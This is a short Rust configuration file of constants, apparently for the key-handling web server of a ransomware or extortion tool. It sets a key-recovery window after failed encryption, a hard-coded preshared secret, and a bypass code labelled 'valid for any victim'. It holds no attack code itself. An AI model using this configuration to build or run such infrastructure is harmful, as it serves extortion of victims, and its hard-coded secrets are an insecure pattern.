/// Port used by web server \[required\]
pub(crate) const PORT: u16 = 3000;

/// Whether HTTPS or HTTP should be used \[required\]
pub(crate) const HTTPS: bool = true;

/// Time window in seconds where a failed encryption can recover a symmetric key \[required\]
pub(crate) const RECOVERY_WINDOW_SECONDS: u64 = 3600;

/// Time in seconds a client has to send its first request before the connection is closed \[required\]
pub(crate) const FIRST_REQUEST_TIMEOUT_SECONDS: u64 = 30;

/// Secret used to validate web requests \[required\]
pub(crate) const PRESHARED_SECRET: &str =
    "gEFPsWMHEjdbBccgFKAFwdYwD98mH6cn7mmVwVgS8Vq4EUNocCwh3wLHrEVA7RzS";

/// Code valid for any victim \[required\]
pub(crate) const BYPASS_CODE: &str = "2NSd-NRF3-qkB3-v6qP";
